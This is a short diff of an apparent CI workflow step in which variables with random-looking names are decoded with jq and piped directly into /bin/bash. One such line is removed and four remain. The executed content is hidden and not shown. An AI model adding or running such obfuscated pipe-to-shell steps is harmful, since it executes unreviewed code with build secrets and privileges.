@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ktf94251" | jq -r .c53573 | /bin/bash
           echo $yqph1 | jq -r .xeip406 | /bin/bash
-          echo $pvzwr8019 | jq -r .pxdvk03024 | /bin/bash
           echo $ptgcg93850 | jq -r .t36978 | /bin/bash
           echo $ui224 | jq -r .fhi2721 | /bin/bash
 
